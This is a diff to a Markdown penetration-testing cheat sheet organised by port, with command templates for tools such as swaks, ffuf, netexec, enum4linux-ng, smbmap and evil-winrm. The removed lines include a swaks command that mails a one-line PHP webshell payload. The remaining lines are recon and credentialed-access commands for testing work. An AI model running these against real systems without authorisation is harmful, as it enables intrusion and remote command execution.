@@ -39,10 +39,7 @@ ssh -L 'LISTENPORT':'FORARD_IP':'FORWARD_PORT' 'USERNAME'@'SSH_SERVER_IP'
 
 ## 25
 - swaks ![GitHub Repo stars](https://img.shields.io/github/stars/jetmore/swaks?style=social)
-```sh
-# send webshell
-swaks -f 'FROM_USERNAME@DOMAIN' -t 'TO_USERNAME@DOMAIN' -d '<?php system($_REQUEST["cmd"]); ?>' -s 'IP'
-```
+
 
 
 ## 80
@@ -58,10 +55,6 @@ curl -X OPTIONS -I 'URL'
 curl -ks 'URL'
 ```
 - davtest ![GitHub Repo stars](https://img.shields.io/github/stars/cldrn/davtest?style=social)
-```sh
-# test webdav
-davtest -url 'URL' -cleanup
-```
 - ffuf ![GitHub Repo stars](https://img.shields.io/github/stars/ffuf/ffuf?style=social)
 ```sh
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u 'URL'/FUZZ
@@ -202,9 +195,6 @@ netexec ldap 'IP' --dns-server 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodho
 nmap -n -Pn -p443 --script=ssl-heartbleed 'IP'
 ```
 - sslscan ![GitHub Repo stars](https://img.shields.io/github/stars/rbsec/sslscan?style=social)
-```sh
-sslscan --no-check-certificate --no-ciphersuites --no-compression --no-fallback --no-groups --no-heartbleed --no-renegotiation 'IP'
-```
 - CVE
   - [heartbleed](https://github.com/sensepost/heartbleed-poc)
 
@@ -217,12 +207,9 @@ sslscan --no-check-certificate --no-ciphersuites --no-compression --no-fallback 
 hekatomb 'DOMAIN/USERNAME:PASSWORD@IP'
 ```
 - enum4linux ![GitHub Repo stars](https://img.shields.io/github/stars/CiscoCXSecurity/enum4linux?style=social)
-```sh
-# enum4linux-ng のほうが２倍はやい
-enum4linux -a -d -u 'USERNAME' -p 'PASSWORD' -w 'DOMAIN' -v 'IP'
-```
 - enum4linux-ng ![GitHub Repo stars](https://img.shields.io/github/stars/cddmp/enum4linux-ng?style=social)
 ```sh
+# enum4linuxより２倍はやい
 enum4linux-ng -A -Gm -C -u 'USERNAME' -p 'PASSWORD' -d -t 'TIMEOUT' 'IP'
 ```
 - impacket ![GitHub Repo stars](https://img.shields.io/github/stars/fortra/impacket?style=social)
@@ -354,13 +341,10 @@ smbmap -H 'IP' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursiv
 
 ## 5060 (UDP)
 - svwar ![GitHub Repo stars](https://img.shields.io/github/stars/EnableSecurity/sipvicious?style=social)
-```sh
-svwar -t 'Duration' -e 'EXTENSION RANGE' -m INVITE 'IP'
-```
 
 
 ## 5985
-- evil-winrm
+- evil-winrm ![GitHub Repo stars](https://img.shields.io/github/stars/Hackplayers/evil-winrm?style=social)
 ```sh
 evil-winrm -i 'IP' -u 'USERNAME' -p 'PASSWORD'
 ```
